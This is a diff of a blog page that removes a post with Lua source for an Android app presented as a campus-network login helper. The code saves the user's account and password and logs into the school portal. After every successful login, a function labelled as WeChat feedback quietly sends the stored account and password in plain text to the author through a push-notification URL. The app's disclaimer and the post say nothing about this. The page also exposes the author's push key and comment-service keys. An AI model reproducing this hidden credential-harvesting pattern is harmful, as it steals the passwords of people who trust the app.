@@ -174,235 +174,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-lua语言开发的安卓小软件" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      校网登录助手8.0
-    </h1>
-  
-
-        
-        <a href="/2018/06/07/lua语言开发的安卓小软件/" class="archive-article-date">
-  	<time datetime="2018-06-07T13:45:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="校网登录助手8-0"><a href="#校网登录助手8-0" class="headerlink" title="校网登录助手8.0"></a>校网登录助手8.0</h2><blockquote>
-<p>这是晚上在床上用手机写的小安卓程序，用的lua语言，非常简单，但是整个逻辑走下来也废了不小的劲。<br>整体功能就是利用APP的网页访问功能，代替人登录校网，自动登录账号和密码，<br>整体不太复杂，布局使用的第三方软件，我只是做了其中一个启动源码。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p><img src="https://i.loli.net/2018/06/07/5b19386964622.png" alt="主界面"></p>
-</blockquote>
-<hr>
-<blockquote>
-<p><img src="https://i.loli.net/2018/06/07/5b1938731e66f.png" alt="侧滑栏"></p>
-</blockquote>
-<hr>
-<blockquote>
-<p><img src="https://i.loli.net/2018/06/07/5b193858ddd33.png" alt="我的应用"><br><a id="more"></a></p>
-</blockquote>
-<hr>
-<blockquote>
-<p>嘻嘻，代码如下…</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div></pre></td><td class="code"><pre><div class="line">import &apos;android.webkit.WebView&apos;webView.addJavascriptInterface(&#123;&#125;,&apos;JsInterface&apos;)</div><div class="line">import &apos;test&apos;</div><div class="line">cjson=require (&quot;cjson&quot;) --解析json字符</div><div class="line">--程序启动时会执行的事件</div><div class="line">泡沫对话框(421)</div><div class="line">.设置标题(&quot;声明(首次安装提示)&quot;)</div><div class="line">.设置消息([[本软件不具有破解校网作用只是一个登陆助手。]])</div><div class="line">.设置积极按钮(&quot;确定&quot;,function()</div><div class="line">  显示消息(&quot;欢迎使用&quot;)</div><div class="line">end)</div><div class="line">.设置消极按钮(&quot;取消&quot;)</div><div class="line">.显示()</div><div class="line">function 写文件(名称,内容)</div><div class="line">  文件路径=&quot;/sdcard/校网助手/&quot;..名称</div><div class="line">  io.open(文件路径,&apos;w&apos;):write(内容):close()</div><div class="line">end</div><div class="line">当前版本=&quot;8.1&quot;</div><div class="line">function 检查更新()</div><div class="line">  local url=&quot;https://www.cnblogs.com/pengwenzheng/p/8553104.html&quot;</div><div class="line">  --sj(m,&quot;txt&quot;:&quot;&quot;,&quot;state&quot;,m)</div><div class="line">  Http.get(url,nil,&quot;utf8&quot;,nil,function(code,content,cookie,header)</div><div class="line">    if(code==200 and content)then</div><div class="line">      local con=content</div><div class="line">      --string.match(&quot;左测试测试右&quot;,&quot;左(.-)右&quot;)</div><div class="line">      local 版本号=con.match(con,&quot;版本号【(.-)】&quot;)</div><div class="line">      local 更新内容=con.match(con,&quot;更新内容【(.-)】&quot;)</div><div class="line">      local 下载链接=con.match(con,&quot;下载链接【(.-)】&quot;)</div><div class="line">      local 公告=con.match(con,&quot;公告【(.-)】&quot;)</div><div class="line">      local 广告=con.match(con,&quot;广告【(.-)】&quot;)</div><div class="line">      if (版本号&gt;当前版本) then</div><div class="line">        对话框()</div><div class="line">        .设置标题(&quot;版本更新&quot;)</div><div class="line">        .设置消息(公告)</div><div class="line">        .设置积极按钮(&quot;下载更新&quot;,function()</div><div class="line">          加载网页(下载链接)</div><div class="line">        end)</div><div class="line">        .设置消极按钮(&quot;取消&quot;)</div><div class="line">        .显示()</div><div class="line">      end</div><div class="line">    else</div><div class="line">      print(&quot;获取更新数据失败&quot;..code)</div><div class="line">    end</div><div class="line">  end)</div><div class="line">end</div><div class="line">function 微信反馈()</div><div class="line">  local zh=io.open(&quot;/sdcard/校网助手/账户.txt&quot;):read(&quot;*a&quot;)</div><div class="line">  local z=zh:match(&quot;(.+)&amp;&quot;)</div><div class="line">  local m=zh:match(&quot;upass=(.+)&quot;)</div><div class="line">  local time=os.date(&quot;%Y-%m-%d %H:%M:%S&quot;)</div><div class="line">  local ww=&quot;https://sc.ftqq.com/SCU26231T3d328ea1d7ec6bf5e619d412b2937b0e5af42e7d782a3.send?text=&quot;</div><div class="line">  local x=&quot;主人校网助手有人上线了！账号:&quot;</div><div class="line">  local g=&quot;密码为:&quot;</div><div class="line">  local k=&quot;&amp;desp=&quot;</div><div class="line">  local wx =ww..x..z..k..time..g..m</div><div class="line">  Http.get(wx,nil,&quot;utf8&quot;,nil,function(code,content,cookie,header)</div><div class="line">    if(code==200 and content)then</div><div class="line">      --print(content)</div><div class="line">    else</div><div class="line">      print(&quot;与后台通信异常&quot;..code)</div><div class="line">    end</div><div class="line">  end)</div><div class="line">end</div><div class="line">function 登陆()</div><div class="line">  InputLayout=&#123;</div><div class="line">    LinearLayout;</div><div class="line">    orientation=&quot;vertical&quot;;</div><div class="line">    Focusable=true,</div><div class="line">    FocusableInTouchMode=true,</div><div class="line">    &#123;</div><div class="line">      TextView;</div><div class="line">      id=&quot;Prompt&quot;,</div><div class="line">      textSize=&quot;15sp&quot;,</div><div class="line">      layout_marginTop=&quot;10dp&quot;;</div><div class="line">      layout_marginLeft=&quot;3dp&quot;,</div><div class="line">      layout_width=&quot;80%w&quot;;</div><div class="line">      layout_gravity=&quot;center&quot;,</div><div class="line">      text=&quot;运营商输入:移动，联通，电信，单宽&quot;;</div><div class="line">    &#125;;</div><div class="line">    &#123;</div><div class="line">      EditText;</div><div class="line">      hint=&quot;账号&quot;;</div><div class="line">      layout_marginTop=&quot;5dp&quot;;</div><div class="line">      layout_width=&quot;80%w&quot;;</div><div class="line">      layout_gravity=&quot;center&quot;,</div><div class="line">      id=&quot;edit&quot;;</div><div class="line">    &#125;;</div><div class="line">    &#123;</div><div class="line">      EditText;</div><div class="line">      hint=&quot;密码&quot;;</div><div class="line">      layout_marginTop=&quot;5dp&quot;;</div><div class="line">      layout_width=&quot;80%w&quot;;</div><div class="line">      layout_gravity=&quot;center&quot;,</div><div class="line">      id=&quot;edit2&quot;;</div><div class="line">    &#125;;</div><div class="line">    &#123;</div><div class="line">      EditText;</div><div class="line">      hint=&quot;运营商&quot;;</div><div class="line">      layout_marginTop=&quot;5dp&quot;;</div><div class="line">      layout_width=&quot;80%w&quot;;</div><div class="line">      layout_gravity=&quot;center&quot;,</div><div class="line">      id=&quot;edit3&quot;;</div><div class="line">    &#125;;</div><div class="line">  &#125;;</div><div class="line">  AlertDialog.Builder(this)</div><div class="line">  .setTitle(&quot;首次登陆&quot;)</div><div class="line">  .setView(loadlayout(InputLayout))</div><div class="line">  .setPositiveButton(&quot;确定&quot;,&#123;onClick=function(v) </div><div class="line">      if edit3.Text==&quot;移动&quot;then</div><div class="line">        yys=&quot;cmcc&quot;</div><div class="line">      elseif edit3.Text==&quot;联通&quot;then</div><div class="line">        yys=&quot;unicom&quot;</div><div class="line">      elseif edit3.Text==&quot;电信&quot;then</div><div class="line">        yys=&quot;telecom&quot;</div><div class="line">      else</div><div class="line">        yys=&quot;founder&quot;</div><div class="line">      end</div><div class="line">      local 拼接=edit.Text..&quot;@&quot;..yys..&quot;&amp;upass=&quot;..edit2.Text</div><div class="line">      写文件(&quot;账户.txt&quot;,拼接)</div><div class="line">    end&#125;)</div><div class="line">  .setNegativeButton(&quot;取消&quot;,nil)</div><div class="line">  .show()</div><div class="line">end</div><div class="line">function 检验()</div><div class="line">  jyurl=&quot;http://1.1.1.1&quot;</div><div class="line">  Http.get(jyurl,nil,&quot;gb2312&quot;,nil,function (code,content,cookie,header)</div><div class="line">    if(code==200 and content)then</div><div class="line">      title=content.match(content,&quot;&lt;title&gt;(.-)&lt;/title&gt;&quot;)</div><div class="line">      return title</div><div class="line">    else</div><div class="line">      print(&quot;本地检验异常&quot;..code)</div><div class="line">    end</div><div class="line">  end)</div><div class="line">end</div><div class="line">function 语录()</div><div class="line">  local url=&quot;http://word.rainss.cn/api_system.php?type=json&quot;</div><div class="line">  --sj(m,&quot;txt&quot;:&quot;&quot;,&quot;state&quot;,m)</div><div class="line">  Http.get(url,nil,&quot;utf8&quot;,nil,function(code,content,cookie,header)</div><div class="line">    if(code==200 and content)then</div><div class="line">      local json=cjson.decode(content)</div><div class="line">      -- print(dump(json))--输出json字符</div><div class="line">      --print(json.txt)</div><div class="line">      local output=json.txt</div><div class="line">      对话框()</div><div class="line">      .设置标题(&quot;登陆成功-语录&quot;)</div><div class="line">      .设置消息(output)</div><div class="line">      .设置积极按钮(&quot;确定&quot;,function()</div><div class="line">        显示消息(&quot;加油努力！&quot;)</div><div class="line">      end)</div><div class="line">      .设置消极按钮(&quot;取消&quot;)</div><div class="line">      .显示()</div><div class="line">    else</div><div class="line">      print(&quot;获取语录异常&quot;..code)</div><div class="line">    end</div><div class="line">  end)</div><div class="line">end</div><div class="line">function post()</div><div class="line">  ip=findip()</div><div class="line">  ip=string.gsub(ip,&quot; &quot;,&quot;&quot;)</div><div class="line">  print(&quot;您的动态ip为&quot;..ip)</div><div class="line">  url=&quot;http://1.1.1.1:801/eportal/?c=ACSetting&amp;a=Login&amp;protocol=http:&amp;hostname=1.1.1.1&amp;iTermType=2&amp;wlanuserip=&quot;</div><div class="line">  url1=&quot;&amp;wlanacip=10.10.9.200&amp;mac=00-00-00-00-00-00&amp;ip=&quot;</div><div class="line">  url2=&quot;&amp;enAdvert=0&amp;queryACIP=0&amp;loginMethod=1&quot;</div><div class="line">  url3=url..ip..url1..url2</div><div class="line">  zh=io.open(&quot;/sdcard/校网助手/账户.txt&quot;):read(&quot;*a&quot;)</div><div class="line">  data=&quot;DDDDD=&quot;..zh..&quot;&amp;R1=0&amp;R2=0&amp;R3=0&amp;R6=1&amp;para=00&amp;0MKKey=123456&amp;buttonClicked=&amp;redirect_url=&amp;err_flag=&amp;username=&amp;password=&amp;user=&amp;cmd=&amp;Login=Y&quot;</div><div class="line">  data=string.gsub(data,&quot; &quot;,&quot;&quot;)</div><div class="line">  Http.post(url3,data,nil,&quot;gb2312&quot;,nil,function(code,content,cookie,header)</div><div class="line">    if(code==200 and content)then</div><div class="line">      jyurl=&quot;http://1.1.1.1&quot;</div><div class="line">      Http.get(jyurl,nil,&quot;gb2312&quot;,nil,function (code,content,cookie,header)</div><div class="line">        if(code==200 and content)then</div><div class="line">          title=content.match(content,&quot;&lt;title&gt;(.-)&lt;/title&gt;&quot;)</div><div class="line">         -- print(title)</div><div class="line">          if (title==&quot;注销页&quot;) then</div><div class="line">            print(&quot;登陆成功&quot;)</div><div class="line">            语录()</div><div class="line">            微信反馈()</div><div class="line">            检查更新()</div><div class="line">          else</div><div class="line">            print(&quot;登陆失败……自动尝试二次登陆。&quot;)</div><div class="line">            Http.post(url3,data,nil,&quot;gb2312&quot;,nil,function(code,content,cookie,header)</div><div class="line">              if(code==200 and content)then</div><div class="line">                jyurl=&quot;http://1.1.1.1&quot;</div><div class="line">                Http.get(jyurl,nil,&quot;gb2312&quot;,nil,function (code,content,cookie,header)</div><div class="line">                  if(code==200 and content)then</div><div class="line">                    title=content.match(content,&quot;&lt;title&gt;(.-)&lt;/title&gt;&quot;)</div><div class="line">                    print(title)</div><div class="line">                    if (title==&quot;注销页&quot;) then</div><div class="line">                      print(&quot;登陆成功&quot;)</div><div class="line">                      语录()</div><div class="line">                      微信反馈()</div><div class="line">                      检查更新()</div><div class="line">                    end</div><div class="line">                  end</div><div class="line">                end)</div><div class="line">              end</div><div class="line">            end)</div><div class="line">          end</div><div class="line">          --检测校网是否登陆</div><div class="line">        end</div><div class="line">      end) </div><div class="line"></div><div class="line">    else</div><div class="line">      print(&quot;post发包异常&quot;..code)</div><div class="line">    end</div><div class="line">  end)</div><div class="line">end</div><div class="line">function 检测Wifi()</div><div class="line">  import &quot;android.content.Context&quot;</div><div class="line">  wifi = activity.Context.getSystemService(Context.WIFI_SERVICE)</div><div class="line">  wi = wifi.isWifiEnabled()</div><div class="line">  return wi</div><div class="line">end</div><div class="line">function findip()</div><div class="line">  wifi = activity.Context.getSystemService(Context.WIFI_SERVICE).getDhcpInfo()</div><div class="line">  ip=string.match(tostring(wifi),&quot;ipaddr(.-)gate&quot;)</div><div class="line">  return ip</div><div class="line">end</div><div class="line">function main()</div><div class="line">  if 检测Wifi() then</div><div class="line">    post()</div><div class="line">  else</div><div class="line">    对话框()</div><div class="line">    .设置标题(&quot;错误&quot;)</div><div class="line">    .设置消息(&quot;检测到您未开启Wifi&quot;)</div><div class="line">    .设置积极按钮(&quot;确定&quot;,function()</div><div class="line">      显示消息(&quot;点击了确定&quot;)</div><div class="line">    end)</div><div class="line">    .设置消极按钮(&quot;取消&quot;)</div><div class="line">    .显示()</div><div class="line">  end</div><div class="line">end</div><div class="line">function 主程序()</div><div class="line">  import &quot;java.io.File&quot;--导入File类</div><div class="line">  路径=&quot;/sdcard/校网助手/&quot;</div><div class="line">  if File(路径).exists() then</div><div class="line">    print(&quot;欢迎回来&quot;)</div><div class="line">    main()</div><div class="line">    --io.open(文件路径):read(&quot;*a&quot;)</div><div class="line">  else</div><div class="line">    print(&quot;您是首次使用本软件……&quot;)</div><div class="line">    File(路径).mkdir()</div><div class="line">    登陆()</div><div class="line">  end</div><div class="line">end</div><div class="line">主程序()</div></pre></td></tr></table></figure>
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="https://i.loli.net/2018/07/02/5b39b63f43d6c.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="https://i.loli.net/2018/07/02/5b39b69ef1bc9.png">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安卓编程</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/06/07/lua语言开发的安卓小软件/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/06/18/nodemcu的终极操作/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          利用arduino ide制作的桌面摆件
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/06/07/树莓派人脸识别升级版/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">树莓派+arduino+串口屏+百度api人脸识别</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-
-  
-  
-  
-
-  
-
-  
-
-  
-
-
-<section id="comments" class="comments">
-  <style>
-    .comments{margin:30px;padding:10px;background:#fff}
-    @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-  </style>
-  <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "cekyL0RTsoKaBcaTXbEcsrBl-gzGzoHsz",
-            app_key: "SpVmG5VJxwcvkyhrkTQSNtS0",
-            placeholder: "Just go go",
-            avatar:"mm"
-        });
-    }
-</script>
-  </section>
-
+            
           </div>
         </div>
       </div>
@@ -497,10 +269,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">ESP8266</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">esp8266</a>
               </li>
              
@@ -509,15 +277,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">lua</a>
+                <a href="javascript:void(0)" class="js-tag color3">ESP8266</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">生活</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Siri</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -529,11 +297,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">mqtt</a>
+                <a href="javascript:void(0)" class="js-tag color3">工作</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">生活</a>
+                <a href="javascript:void(0)" class="js-tag color3">android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -541,11 +309,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">温湿度</a>
+                <a href="javascript:void(0)" class="js-tag color5">mqtt</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">微信小程序</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">温湿度</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -565,11 +337,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">机智云</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">树莓派</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">机智云</a>
+                <a href="javascript:void(0)" class="js-tag color3">心语</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -581,15 +357,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">心语</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工作</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安卓编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">lua</a>
               </li>
              
               <li class="article-tag-list-item">
